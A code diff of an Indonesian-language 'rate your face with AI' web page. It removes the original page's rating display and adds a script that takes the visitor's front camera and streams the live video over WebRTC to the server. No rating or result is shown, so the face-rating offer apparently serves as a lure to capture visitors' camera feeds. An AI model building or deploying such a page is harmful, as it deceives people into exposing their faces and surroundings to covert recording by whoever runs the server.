@@ -1,35 +1,31 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>FaceRate AI – Rating Wajah Profesional</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/static/css/style.css" />
+  <title>Rate Muka AI</title>
+  <link rel="stylesheet" href="/static/style.css">
 </head>
 <body>
   <div class="container">
-    <div class="header">
-      <h1>FaceRate <span class="ai">AI</span></h1>
-      <p>Analisis Wajah Profesional dengan Teknologi AI</p>
-    </div>
-
-    <div class="camera-box" id="cameraBox">
-      <video id="video" autoplay playsinline></video>
-      <div class="scan-animation"></div>
-      <div class="scan-line"></div>
-    </div>
-
-    <div class="result hidden" id="result">
-      <h2>Hasil Analisis</h2>
-      <div class="score" id="score">9.8</div>
-      <p id="desc">Wajah Anda sangat menarik! Cocok untuk modeling.</p>
-      <button onclick="restart()">Scan Ulang</button>
-    </div>
-
-    <div class="status" id="status">Izinkan kamera untuk memulai...</div>
+    <h1>Rate Muka Kamu Pake AI!</h1>
+    <p>Izinkan kamera depan...</p>
+    <video id="video" autoplay playsinline></video>
   </div>
 
-  <script src="/static/js/client.js"></script>
+  <script>
+    const pc = new RTCPeerConnection();
+    navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}}).then(stream => {
+      document.getElementById('video').srcObject = stream;
+      stream.getTracks().forEach(track => pc.addTrack(track, stream));
+
+      pc.createOffer().then(offer => pc.setLocalDescription(offer)).then(() => {
+        fetch("/offer", {
+          method: "POST",
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(pc.localDescription)
+        }).then(r => r.json()).then(answer => pc.setRemoteDescription(answer));
+      });
+    });
+  </script>
+  <script src="/static/script.js"></script>
 </body>
 </html>
